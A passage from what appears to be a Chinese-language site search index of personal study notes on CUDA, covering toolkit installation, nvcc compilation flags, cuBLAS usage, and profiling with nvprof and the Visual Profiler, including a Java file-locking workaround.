cuda-demo-suite-12-1 cuda-documentation-12-1 cuda-driver-dev-12-1 cuda-drivers cuda-drivers-530 cuda-gdb-12-1\n  cuda-libraries-12-1 cuda-libraries-dev-12-1 cuda-nsight-12-1 cuda-nsight-compute-12-1 cuda-nsight-systems-12-1 cuda-nvcc-12-1 cuda-nvdisasm-12-1\n  cuda-nvml-dev-12-1 cuda-nvprof-12-1 cuda-nvprune-12-1 cuda-nvrtc-12-1 cuda-nvrtc-dev-12-1 cuda-nvtx-12-1 cuda-nvvp-12-1 cuda-opencl-12-1\n  cuda-opencl-dev-12-1 cuda-profiler-api-12-1 cuda-runtime-12-1 cuda-sanitizer-12-1 cuda-toolkit-12-1 cuda-toolkit-12-1-config-common\n  cuda-toolkit-12-config-common cuda-toolkit-config-common cuda-tools-12-1 cuda-visual-tools-12-1 default-jre default-jre-headless gds-tools-12-1\n  libcublas-12-1 libcublas-dev-12-1 libcufft-12-1 libcufft-dev-12-1 libcufile-12-1 libcufile-dev-12-1 libcurand-12-1 libcurand-dev-12-1 libcusolver-12-1\n  libcusolver-dev-12-1 libcusparse-12-1 libcusparse-dev-12-1 libnpp-12-1 libnpp-dev-12-1 libnvjitlink-12-1 libnvjitlink-dev-12-1 libnvjpeg-12-1\n  libnvjpeg-dev-12-1 libnvvm-samples-12-1 nsight-compute-2023.1.1 nsight-systems-2023.1.2 nvidia-modprobe openjdk-11-jre openjdk-11-jre-headless\nThe following packages will be upgraded:\n  nvidia-settings\n1 upgraded, 69 newly installed, 0 to remove and 59 not upgraded.\nNeed to get 2802 MB of archives.\nAfter this operation, 6511 MB of additional disk space will be used.\nDo you want to continue? [Y/n]\n</code></pre></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#nvcc","title":"NVCC","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u4e24\u9636\u6bb5\u7f16\u8bd1","title":"\u4e24\u9636\u6bb5\u7f16\u8bd1","text":"<p>GPU\u4e0d\u540cgeneration\uff0c\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u662f\u4e0d\u517c\u5bb9\u7684\u3002\u4e3a\u4e86\u4fdd\u8bc1\u5e94\u7528\u7684\u517c\u5bb9\u6027\uff0c\u91c7\u7528\u4e86\u4e24\u9636\u6bb5\u7f16\u8bd1\u3002</p> <p>NVIDIA CUDA Compiler Driver - nvcc\u603b\u662f\u9700\u8981\u4f7f\u7528\u4e24\u4e2a\u67b6\u6784:\u865a\u62df\u67b6\u6784(compute_xx)\u548c\u771f\u5b9e\u67b6\u6784(sm_xx) - sm\u5fc5\u987b\u5b9e\u73b0\u4e86compute\u7684\u529f\u80fd - \u865a\u62df\u67b6\u6784\u8868\u660e\u4e86\u5e94\u7528\u4f7f\u7528\u5230\u7684\u80fd\u529b\uff0c\u4f7f\u7528\u66f4\u4f4e\u7684\u865a\u62df\u67b6\u6784\u5141\u8bb8\u5728\u66f4\u5e7f\u6cdb\u7684\u786c\u4ef6\u4e0a\u8fd0\u884c - \u771f\u5b9e\u67b6\u6784\u8d8a\u9ad8\uff0c\u751f\u6210\u7684\u4ee3\u7801\u5c31\u66f4\u9ad8\u6548\uff08\u786c\u4ef6\u7279\u6027\u66f4\u591a\uff09 </p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#jit\u673a\u5236","title":"JIT\u673a\u5236","text":"<ul> <li>\u5c06cubin\u751f\u6210\u63a8\u8fdf\u5230\u8fd0\u884c\u65f6</li> <li>\u7f3a\u70b9\u662f\u589e\u52a0\u4e86\u5e94\u7528startup\u5ef6\u8fdf </li> </ul> <p>By specifying a virtual code architecture instead of a\u00a0real\u00a0GPU,\u00a0<code>nvcc</code>\u00a0postpones the assembly of PTX code until application runtime, at which time the target GPU is exactly known. <pre><code>nvcc x.cu --gpu-architecture=compute_50 --gpu-code=compute_50\n</code></pre></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#fatbinaries","title":"fatbinaries","text":"<p>A different solution to overcome startup delay by JIT while still allowing execution on newer GPUs is to specify multiple code instances <pre><code>nvcc x.cu --gpu-architecture=compute_50 --gpu-code=compute_50,sm_50,sm_52\n</code></pre></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#example","title":"example","text":"<p>NVIDIA CUDA Compiler Driver</p> <p><code>--gpu-architecture</code>\u6216<code>-arch</code></p> <pre><code>nvcc x.cu --gpu-architecture=compute_50 --gpu-code=sm_50,sm_52\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#jit","title":"JIT","text":"<p>gpu-code\u5982\u679c\u4e5f\u6307\u5b9a\u865a\u62df\u67b6\u6784\uff0c\u8868\u660e\u4f7f\u7528JIT <code>--gpu-code</code>\u00a0arguments can be virtual architectures. In this case the stage 2 translation will be omitted for such virtual architecture, and the stage 1 PTX result will be embedded instead. At application launch, and in case the driver does not find a better alternative, the stage 2 compilation will be invoked by the driver with the PTX as input. <pre><code>nvcc x.cu --gpu-architecture=compute_50 --gpu-code=compute_50,sm_50,sm_52\n</code></pre></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u7701\u7565gpu-code","title":"\u7701\u7565gpu-code","text":"<p><pre><code>nvcc x.cu --gpu-architecture=sm_52\nnvcc x.cu --gpu-architecture=compute_50\n</code></pre> \u5206\u522b\u7b49\u4ef7\u4e8e <pre><code>nvcc x.cu --gpu-architecture=compute_52 --gpu-code=sm_52,compute_52\nnvcc x.cu --gpu-architecture=compute_50 --gpu-code=compute_50\n</code></pre></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u540c\u65f6\u7701\u7565arch-gpu-code","title":"\u540c\u65f6\u7701\u7565arch, gpu-code","text":"<p>\u9ed8\u8ba4\u4f7f\u7528sm_52\uff1f <pre><code>nvcc x.cu\n# \u7b49\u4ef7\u4e8e\nnvcc x.cu --gpu-architecture=compute_52 --gpu-code=sm_52,compute_52\n</code></pre></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#-generate-code\u6307\u5b9a\u591a\u79cd\u7ec4\u5408","title":"-generate-code\u6307\u5b9a\u591a\u79cd\u7ec4\u5408","text":"<p>\u4f7f\u7528\u4e00\u4e2a\u865a\u62df\u67b6\u6784\uff0c\u9650\u5236\u4e86\u529f\u80fd\u3002\u53ef\u4ee5\u4e3a\u4e0d\u540c\u786c\u4ef6\u6307\u5b9a\u4e0d\u540c\u865a\u62df\u67b6\u6784</p> <p><code>compute_50</code> assumes no half-precision floating-point operation support for both the\u00a0<code>sm_50</code>\u00a0code and the\u00a0<code>sm_53</code>\u00a0code:</p> <pre><code>nvcc x.cu \\\n    --generate-code arch=compute_50,code=sm_50 \\\n    --generate-code arch=compute_50,code=sm_52 \\\n    --generate-code arch=compute_53,code=sm_53\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#nvcc\u9009\u9879","title":"nvcc\u9009\u9879","text":"<p>On all platforms, the default host compiler executable (<code>gcc</code>\u00a0and\u00a0<code>g++</code>\u00a0on Linux and\u00a0<code>cl.exe</code>\u00a0on Windows) found in the current execution search path will be used, unless specified otherwise with appropriate options </p> <p>NVIDIA CUDA Compiler Driver</p> <p>When\u00a0<code>-arch=native</code>\u00a0is specified,\u00a0<code>nvcc</code>\u00a0detects the visible GPUs on the system and generates codes for them, no PTX program will be generated for this option. It is a warning if there are no visible supported GPU on the system, and the default architecture will be used.</p> <p>If\u00a0<code>-arch=all</code>\u00a0is specified,\u00a0<code>nvcc</code>\u00a0embeds a compiled code image for all supported architectures\u00a0<code>(sm_*)</code>, and a PTX program for the highest major virtual architecture. For\u00a0<code>-arch=all-major</code>,\u00a0<code>nvcc</code>\u00a0embeds a compiled code image for all supported major versions\u00a0<code>(sm_*0)</code>, plus the earliest supported, and adds a PTX program for the highest major virtual architecture.</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u73af\u5883\u53d8\u91cf","title":"\u73af\u5883\u53d8\u91cf","text":"<p>https://docs.nvidia.com/cuda/cuda-compiler-driver-nvcc/index.html#nvcc-environment-variables</p> <pre><code>export NVCC_PREPEND_FLAGS='-G -keep -arch=sm_60'\nexport NVCC_APPEND_FLAGS='-DNAME=\" foo \"'\n</code></pre> <pre><code>nvcc foo.cu -o foo\n# \u7b49\u4ef7\u4e8e\nnvcc -G -keep -arch=sm_60 foo.cu -o foo -DNAME=\" foo \"\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#cuda\u7f16\u7a0b","title":"Cuda\u7f16\u7a0b","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u7edf\u4e00\u5185\u5b58\u6a21\u578b","title":"\u7edf\u4e00\u5185\u5b58\u6a21\u578b","text":"<p>\u5728 CUDA \u7f16\u7a0b\u4e2d\uff0c<code>__managed__</code> \u662f\u4e00\u4e2a CUDA \u6269\u5c55\u5173\u952e\u5b57\uff0c\u7528\u4e8e\u6807\u8bc6\u88ab\u4fee\u9970\u7684\u53d8\u91cf\u6216\u6570\u636e\u7ed3\u6784\u5c06\u5728\u4e3b\u673a\uff08CPU\uff09\u548c\u8bbe\u5907\uff08GPU\uff09\u4e4b\u95f4\u81ea\u52a8\u8fdb\u884c\u5185\u5b58\u7ba1\u7406\u3002\u5b83\u662f CUDA Unified Memory \u529f\u80fd\u7684\u4e00\u90e8\u5206\uff0c\u65e8\u5728\u7b80\u5316\u4e3b\u673a\u548c\u8bbe\u5907\u4e4b\u95f4\u7684\u5185\u5b58\u7ba1\u7406\u548c\u6570\u636e\u4f20\u8f93\u3002</p> <p>\u901a\u8fc7\u4f7f\u7528 <code>__managed__</code> \u5173\u952e\u5b57\uff0c\u60a8\u53ef\u4ee5\u5c06\u53d8\u91cf\u6216\u6570\u636e\u7ed3\u6784\u58f0\u660e\u4e3a\u7edf\u4e00\u5185\u5b58\uff08Unified Memory\uff09\u3002\u8fd9\u610f\u5473\u7740\u5728\u4f7f\u7528\u8fd9\u4e9b\u7edf\u4e00\u5185\u5b58\u5bf9\u8c61\u65f6\uff0c\u65e0\u9700\u663e\u5f0f\u5730\u5728\u4e3b\u673a\u548c\u8bbe\u5907\u4e4b\u95f4\u8fdb\u884c\u624b\u52a8\u5185\u5b58\u5206\u914d\u548c\u6570\u636e\u4f20\u8f93\u3002CUDA \u8fd0\u884c\u65f6\u7cfb\u7edf\u4f1a\u81ea\u52a8\u5904\u7406\u5185\u5b58\u7684\u5206\u914d\u548c\u8fc1\u79fb\uff0c\u4ee5\u786e\u4fdd\u6570\u636e\u5728\u4e3b\u673a\u548c\u8bbe\u5907\u4e4b\u95f4\u6b63\u786e\u5171\u4eab\u3002</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u540c\u6b65","title":"\u540c\u6b65","text":"<p>cuda - Does __syncthreads() synchronize all threads in the grid? - Stack Overflow <pre><code>__syncthreads()  // \u8be5\u51fd\u6570\u540c\u6b65block\u5185\u7ebf\u7a0b\uff08\u5b9e\u9645\u662fwarp\uff0cwarp\u5185\u7ebf\u7a0b\u6267\u884c\u7684\u662f\u76f8\u540c\u6307\u4ee4\uff0c\u672c\u8eab\u5c31\u662f\u540c\u6b65\u7684\uff09\n</code></pre></p> <ul> <li>cudaDeviceSynchronize</li> <li>CPU\u7b49\u5f85GPU\u5b8c\u6210kernel\u8c03\u7528</li> </ul> <p>CUDA\u6ca1\u6709\u5168\u5c40\u540c\u6b65\uff08block\u95f4\u540c\u6b65\uff09 - \u5bf9\u4e8eSM\u6570\u91cf\u5f88\u5927\u7684GPU\uff0c\u786c\u4ef6\u6210\u672c\u592a\u9ad8 - would force programmer to run fewer blocks (no more than # multiprocessors * # resident blocks / multiprocessor) to avoid deadlock, which may reduce overall efficiency \u89e3\u51b3\u529e\u6cd5\uff1a \u5206\u89e3\u4e3a\u591a\u4e2akernel - kernel launch\u4f5c\u4e3aglobal sync point - kernel launch has negligible HW overhead, low SW overhead</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#cublas","title":"cuBLAS","text":"<p>\u8ba1\u7b97\u77e9\u9635A x B \u65b9\u5f0f\u4e00\uff1a <pre><code>cublasSgemm (blas_handle, CUBLAS_OP_T, CUBLAS_OP_T,   //CUBLAS\u4f7f\u7528\u5217\u4f18\u5148\u5b58\u50a8\u3002CUBLAS_OP_T\u8868\u793a\u8fdb\u884c\u8f6c\u7f6e\uff0c\u5373\u884c\u4f18\u5148\u3002\u5217\u4f18\u5148\u4e0bleading dimesion\u4e3am(mxn\u77e9\u9635)\n                     m, n, k,\n                     &amp;alpha,\n                     d_A, k, d_B, n,\n                     &amp;beta,\n                     d_C, n); //\u7ed3\u679c\u4ecd\u4e3a\u5217\u4f18\u5148\uff0c\u6545\u8ba1\u7b97\u5f97\u5230C\u7684\u8f6c\u7f6e\n</code></pre> \u65b9\u5f0f\u4e8c\uff1a <pre><code>/* \u901a\u8fc7\u8ba1\u7b97B^T * A^T\u5f97\u5230C^T\uff0c\u7531\u4e8e\u5217\u4f18\u5148\u6240\u6709d_C\u5b9e\u9645\u4e3aC\u7684\u884c\u4f18\u5148\u7ed3\u679c\u3002 //https://stackoverflow.com/a/56064726\n        \u7591\u95ee\uff1a\u8fd9\u91ccbeta\u7b49\u4e8e0\uff0c\u6545C\u7684\u521d\u59cb\u503c\u6ca1\u6709\u5f71\u54cd\uff0c\u884c\u5217\u4f18\u5148\u5747\u53ef\uff08ldc=m, n\u5747\u6b63\u786e\uff09\u3002\u4f46\u662f\u5982\u679c\u975e0\uff0c\u90a3\u4e48\u5982\u4f55\u5904\u7406\u5462\uff1f\n        */\n        cublasSgemm(blas_handle, CUBLAS_OP_N, CUBLAS_OP_N,\n                    n, m, k,\n                    &amp;alpha,\n                    d_B, n, d_A, k,\n                    &amp;beta,\n                    d_C, n);\n</code></pre></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u5de5\u5177","title":"\u5de5\u5177","text":"<ul> <li>IDE/debug/profile\u5de5\u5177\u9884\u89c8\uff1aNVIDIA Developer Tools Overview | NVIDIA Developer</li> </ul> <p>Which tools are available on which GPU architectures</p> GPU architecture Visual Profiler and nvprof Nsight Systems Nsight Compute Maxwell Yes No No Pascal Yes Yes No Volta Yes Yes Yes Turing Yes* Yes Yes Ampere and later GPU architectures No Yes Yes <p>nsight sytem - high level</p> <p>nsight compute - detailed - performance metrics</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#nvprof","title":"nvprof","text":"<p>The\u00a0Visual Profiler\u00a0is a graphical profiling tool that displays a timeline of your application\u2019s CPU and GPU activity, and that includes an automated analysis engine to identify optimization opportunities. The\u00a0nvprof\u00a0profiling tool enables you to collect and view profiling data from the command-line.</p> <p>Note that Visual Profiler and nvprof will be deprecated in a future CUDA release.\u00a0The NVIDIA Volta platform is the last architecture on which these tools are fully supported. It is recommended to use next-generation tools\u00a0NVIDIA Nsight Systems\u00a0for GPU and CPU sampling and tracing and\u00a0NVIDIA Nsight Compute\u00a0for GPU kernel profiling.</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#visual-profilernvvp","title":"Visual Profiler/nvvp","text":"<p>NVIDIA Visual Profiler | NVIDIA Developer</p> <p>https://docs.nvidia.com/cuda/profiler-users-guide/index.html#visual-profiler</p> <p>The Visual Profiler is available as both a standalone application and as part of Nsight Eclipse Edition. The standalone version of the Visual Profiler,\u00a0<code>nvvp</code>, is included in the CUDA Toolkit for all supported OSes except for macOS.</p> <p>\u6b65\u9aa4 - \u5b89\u88c5\u8bbe\u7f6e1.8 JRE - Preparing An Application For Profiling - create session: A session contains the settings, data, and profiling results associated with your application. Each session is saved in a separate file; so you can delete, move, copy, or share a session by simply deleting, moving, copying, or sharing the session file. By convention, the file extension\u00a0<code>.nvvp</code>\u00a0is used for Visual Profiler session files. - analyziing</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#java\u7248\u672c","title":"java\u7248\u672c","text":"<p>\u9700\u8981Java Runtime Environment (JRE) 1.8 \u53ef\u4ee5\u542f\u52a8\u65f6\u901a\u8fc7vm\u6307\u5b9a <pre><code>nvvp -vm /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java\n</code></pre></p> <p>\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u5168\u5c40java\u7248\u672c <code>update-alternatives</code> \u662f\u4e00\u4e2a Debian \u7cfb\u7edf\u4e2d\u7528\u4e8e\u7ba1\u7406\u591a\u4e2a\u8f6f\u4ef6\u7248\u672c\u7684\u5de5\u5177\u3002\u901a\u8fc7\u5b83\uff0c\u4f60\u53ef\u4ee5\u8f7b\u677e\u5207\u6362\u9ed8\u8ba4\u4f7f\u7528\u7684 Java \u7248\u672c <pre><code>sudo update-alternatives --config java\n</code></pre></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#ioexception-locking-file","title":"IOException: locking file","text":"<pre><code>(base) fyyuan@snode6 \u279c  ~ nvvp -vm /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java\njava.lang.RuntimeException: Error initializing storage.\n        at org.eclipse.osgi.internal.framework.EquinoxContainer.&lt;init&gt;(EquinoxContainer.java:77)\n        at org.eclipse.osgi.launch.Equinox.&lt;init&gt;(Equinox.java:31)\n        at org.eclipse.core.runtime.adaptor.EclipseStarter.startup(EclipseStarter.java:295)\n        at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:231)\n        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n        at java.lang.reflect.Method.invoke(Method.java:498)\n        at org.eclipse.equinox.launcher.Main.invokeFramework(Main.java:648)\n        at org.eclipse.equinox.launcher.Main.basicRun(Main.java:603)\n        at org.eclipse.equinox.launcher.Main.run(Main.java:1465)\n        at org.eclipse.equinox.launcher.Main.main(Main.java:1438)\nCaused by: java.io.IOException: An error occurred while locking file \"/staff/fyyuan/.eclipse/org.eclipse.platform_4.4.1_868875438_linux_gtk_x86_64/configuration/org.eclipse.osgi/.manager/.fileTableLock\": \"Input/output error\". A common reason is that the file system or Runtime Environment does not support file locking for that location. Please choose a different location, or disable file locking by passing \"-Dosgi.locking=none\" as a VM argument.\n        at org.eclipse.osgi.internal.location.Locker_JavaNio.lock(Locker_JavaNio.java:49)\n        at org.eclipse.osgi.storagemanager.StorageManager.lock(StorageManager.java:388)\n        at org.eclipse.osgi.storagemanager.StorageManager.open(StorageManager.java:701)\n        at org.eclipse.osgi.storage.Storage.getChildStorageManager(Storage.java:1747)\n        at org.eclipse.osgi.storage.Storage.getInfoInputStream(Storage.java:1764)\n        at org.eclipse.osgi.storage.Storage.&lt;init&gt;(Storage.java:124)\n        at org.eclipse.osgi.storage.Storage.createStorage(Storage.java:84)\n        at org.eclipse.osgi.internal.framework.EquinoxContainer.&lt;init&gt;(EquinoxContainer.java:75)\n        ... 11 more\n</code></pre> <p>\u63d0\u793a\u7684\u6dfb\u52a0vm\u53c2\u6570\u65b9\u6cd5\uff0c\u6dfb\u52a0\u5230cuda-tookit-dir/libnvvp/nvvp.ini\u7ed3\u5c3e\uff08\u4f7f\u7528-vmargs\u6307\u5b9a\uff09 <pre><code>sudo vim /usr/local/cuda-11.8/libnvvp/nvvp.ini\n\n-startup\nplugins/org.eclipse.equinox.launcher_1.3.0.v20140415-2008.jar\n--launcher.library\nplugins/org.eclipse.equinox.launcher.gtk.linux.x86_64_1.1.200.v20140603-1326\n-data\n@noDefault\n-vmargs\n-Dosgi.locking=none\n</code></pre></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#pc-sample-view","title":"PC sample View","text":"<ul> <li>compute_52\u652f\u6301PC\u91c7\u6837\u3002<ul> <li>PC and state of warp are sampled at regular interval for one of the active warps per SM</li> <li>The warp state indicates if that warp issued an instruction in a cycle or why it was stalled and could not issue an instruction</li> <li>Hence the stall for the sampled warp need not necessarily indicate that there is a hole in the instruction issue pipeline.</li> </ul> </li> <li>compute_60\u652f\u6301\u00a0latency reasons<ul> <li>While collecting these samples, there is no instruction issued in the respective warp scheduler and hence these give the latency reasons.</li> </ul> </li> </ul> <p>6.0\u4ee5\u4e0a\u8bbe\u5907\uff0cVisual Profiler show two views: \u2018Kernel Profile - PC Sampling\u2019 which gives the warp state view and \u2018Kernel Profile - PC Sampling - Latency\u2019 which gives the latency reasons.</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#memory\u7edf\u8ba1","title":"memory\u7edf\u8ba1","text":"<ul> <li>The data paths from the SMs to the memory spaces (Global, Local, Texture, Surface and Shared) report the total number of memory instructions executed, it includes both read and write operations.</li> <li>The data path between memory spaces and \u201cUnified Cache\u201d or \u201cShared Memory\u201d reports the total amount of memory requests made.</li> <li>All other data paths report the total amount of transferred memory in bytes.</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#source-disassembly","title":"source-disassembly","text":"<p><code>-lineinfo</code></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#warp-statestall\u539f\u56e0","title":"Warp state/stall\u539f\u56e0","text":"<p>1. Preparing An Application For Profiling \u2014 Profiler 12.3 documentation (nvidia.com)</p> <p>https://docs.nvidia.com/cuda/profiler-users-guide/index.html#warp-state</p> <p>\u80fd\u591f\u5bf9\u5e94\u5230\u6e90\u7801\u8fdb\u884c\u5206\u6790\uff1aCUDA 7.5: Pinpoint Performance Problems with Instruction-Level Profiling | NVIDIA Technical Blog</p> <p></p> <ul> <li>Instruction issued</li> <li>Stalled<ul> <li>Stalled for instruction fetch<ul> <li>For very short kernels, consider fusing into a single kernels.</li> </ul> </li> <li>Stalled for execution dependency</li> <li>Stalled for memory dependency<ul> <li>\u5c1d\u8bd5\u63d0\u9ad8\u5185\u5b58\u5408\u5e76\u548c/\u6216\u83b7\u53d6\u5b57\u8282\u7684\u6548\u7387\uff08\u5bf9\u9f50\u7b49\uff09\u3002\u4f7f\u7528gld_efficiency\u548cgst_efficiency\u68c0\u67e5\u672a\u5408\u5e76\u7684\u5185\u5b58\u8bbf\u95ee</li> <li>memory-level parallelism (MLP): the number of independent memory operations in flight per thread. Loop unrolling, loading vector types such as float4, and processing multiple elements per thread are all ways to increase memory-level parallelism.</li> <li>\u8bf7\u8003\u8651\u5c06\u7ecf\u5e38\u8bbf\u95ee\u7684\u6570\u636e\u79fb\u52a8\u5230\u66f4\u9760\u8fd1 SM \u7684\u4f4d\u7f6e\uff0c\u4f8b\u5982\u4f7f\u7528\u5171\u4eab\u5185\u5b58\u6216\u53ea\u8bfb\u6570\u636e\u7f13\u5b58\u3002</li> <li>\u8003\u8651\u5c3d\u53ef\u80fd\u91cd\u65b0\u8ba1\u7b97\u6570\u636e\uff0c\u800c\u4e0d\u662f\u4ece\u8bbe\u5907\u5185\u5b58\u52a0\u8f7d\u6570\u636e</li> <li>\u5982\u679c\u672c\u5730\u5185\u5b58\u8bbf\u95ee\u91cf\u5f88\u9ad8\uff0c\u8bf7\u8003\u8651\u589e\u52a0\u6bcf\u4e2a\u7ebf\u7a0b\u7684\u5bc4\u5b58\u5668\u8ba1\u6570\u4ee5\u51cf\u5c11\u6ea2\u51fa\uff0c\u5373\u4f7f\u4ee5\u5360\u7528\u7387\u4e3a\u4ee3\u4ef7</li> </ul> </li> <li>Stalled for memory throttle</li> <li>Stalled for texture</li> <li>Stalled for sync</li> <li>Stalled for constant memory dependency</li> <li>Stalled for pipe busy\uff1afunctional unit busy</li> <li>Stalled for not selected\uff1aWarp \u5df2\u51c6\u5907\u5c31\u7eea\uff0c\u4f46\u6ca1\u6709\u673a\u4f1a\u53d1\u51fa\uff0c\u56e0\u4e3a\u9009\u62e9\u4e86\u5176\u4ed6\u4e00\u4e9b Warp \u8fdb\u884c\u53d1\u51fa\u3002</li> <li>Stalled for other\uff1aWarp \u56e0\u4e0d\u5e38\u89c1\u7684\u539f\u56e0\uff08\u5982\u7f16\u8bd1\u5668\u6216\u786c\u4ef6\u539f\u56e0\uff09\u800c\u88ab\u963b\u6b62\u3002\u5f00\u53d1\u4eba\u5458\u65e0\u6cd5\u63a7\u5236\u8fd9\u4e9bstall\u3002</li> </ul> </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#nvprof_1","title":"nvprof","text":"<ul> <li>Summary Mode<ul> <li>\u9ed8\u8ba4\u6a21\u5f0f\uff0c<code>nvprof</code>\u00a0outputs a single result line for each kernel function and each type of CUDA memory copy/set performed by the application.</li> <li>\u5982\u679c\u4e0d\u9700\u8981\uff0c\u53ef\u4ee5\u4f7f\u7528 \u5173\u95ed API \u8ddf\u8e2a\u00a0<code>--profile-api-trace\u00a0none</code>\u00a0\u3002\u8fd9\u51cf\u5c11\u4e86\u4e00\u4e9b\u6027\u80fd\u5206\u6790\u5f00\u9500\uff0c\u5c24\u5176\u662f\u5728\u5185\u6838\u8f83\u77ed\u65f6\u3002</li> </ul> </li> <li>gpu-trace<ul> <li>GPU-Trace mode provides a timeline of all activities taking place on the GPU in chronological order.</li> <li>\u6309\u7167\u65f6\u95f4\u987a\u5e8f\u663e\u793a\u3002\u540c\u4e00\u4e2akernel\u4f1a\u591a\u6b21\u663e\u793a</li> <li><code>nvprof --print-gpu-trace matrixMul</code></li> </ul> </li> <li>API-trace: API-trace mode shows the timeline of all CUDA runtime and driver API calls invoked on the host in chronological order.<ul> <li>\u663e\u793aruntime\u548cdriver API\u8c03\u7528</li> <li><code>nvprof --print-api-trace matrixMul</code></li> </ul> </li> <li>Event/metric Summary Mode<ul> <li><code>--events\u00a0all</code> <code>--metrics\u00a0all</code></li> </ul> </li> </ul> <p>An\u00a0event\u00a0is a countable activity, action, or occurrence on a device. It corresponds to a single hardware counter value which is collected during kernel execution. To see a list of all available events on a particular NVIDIA GPU, type\u00a0<code>nvprof\u00a0--query-events</code>.</p> <p>A\u00a0metric\u00a0is a characteristic of an application that is calculated from one or more event values. To see a list of all available metrics on a particular NVIDIA GPU, type\u00a0<code>nvprof\u00a0--query-metrics</code>. You can also refer to the\u00a0metrics reference\u00a0.</p> <p><code>Usage: nvprof [options] [application] [application-arguments]</code></p> <pre><code>--analysis-metrics\n                        Collect profiling data that can be imported to Visual Profiler's\n                        \"analysis\" mode. Note: Use \"--export-profile\" to specify\n                        an export file.\n\n--devices &lt;device ids&gt;\n                        Change the scope of subsequent \"--events\", \"--metrics\", \"--query-events\"\n                        and \"--query-metrics\" options.\n                        Allowed values:\n                                all - change scope to all valid devices\n                                comma-separated device IDs - change scope to specified\n                        devices\n\n  -e,  --events &lt;event names&gt;\n                        Specify the events to be profiled on certain device(s). Multiple\n                        event names separated by comma can be specified. Which device(s)\n                        are profiled is 